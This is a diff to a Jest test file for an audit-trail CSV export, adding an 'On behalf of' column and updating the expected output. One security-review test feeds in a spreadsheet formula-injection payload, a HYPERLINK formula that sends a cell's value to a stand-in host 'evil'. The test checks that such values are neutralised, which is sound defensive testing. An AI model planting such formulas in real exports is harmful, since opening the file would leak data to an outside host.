@@ -238,18 +238,21 @@ describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRo
       },
     ]);
     expect(csv.split('\r\n')).toEqual([
-      'When (UTC),Who,Object,Change,Area,Project,User,Reason,Before,After',
-      '2026-09-25T07:12:00.000Z,Romain Aubert,CR-008,status: Draft → In review,Change control,HLT-026,romain.aubert@epc2i.fr,,,',
-      '2026-09-24T15:30:00.000Z,Léa Marchand,Rate card,"base: 82 → 85 €/h, ""senior""",Settings,,,Annual review,"{""rate"":82}","{""rate"":85}"',
+      'When (UTC),Who,Object,Change,Area,Project,User,Reason,Before,After,On behalf of',
+      '2026-09-25T07:12:00.000Z,Romain Aubert,CR-008,status: Draft → In review,Change control,HLT-026,romain.aubert@epc2i.fr,,,,',
+      '2026-09-24T15:30:00.000Z,Léa Marchand,Rate card,"base: 82 → 85 €/h, ""senior""",Settings,,,Annual review,"{""rate"":82}","{""rate"":85}",',
       '',
     ]);
-    expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet', 'Utilisateur', 'Motif', 'Avant', 'Après']))
-      .toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet,Utilisateur,Motif,Avant,Après\r\n');
+    expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet', 'Utilisateur', 'Motif', 'Avant', 'Après', 'Pour le compte de']))
+      .toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet,Utilisateur,Motif,Avant,Après,Pour le compte de\r\n');
+    // R-051 (P-7d): a decision a substitute recorded names the approver in the last column.
+    expect(auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: 'Antoine Girard', object: 'PO-1082', change: 'status: ordered', area: 'Orders', projectCode: 'HLT-026', onBehalfOf: 'Romain Aubert' }]).split('\r\n')[1])
+      .toBe('2026-09-25T07:12:00.000Z,Antoine Girard,PO-1082,status: ordered,Orders,HLT-026,,,,,Romain Aubert');
     expect(() => auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet'])).toThrow();
     expect(auditCsvFileName('2026-10-09')).toBe('keystone-audit-trail-2026-10-09.csv');
     // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote (the new cells too).
     const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null, reason: '=1+1' }]);
-    expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,,,'=1+1,,`);
+    expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,,,'=1+1,,,`);
   });
 });
 
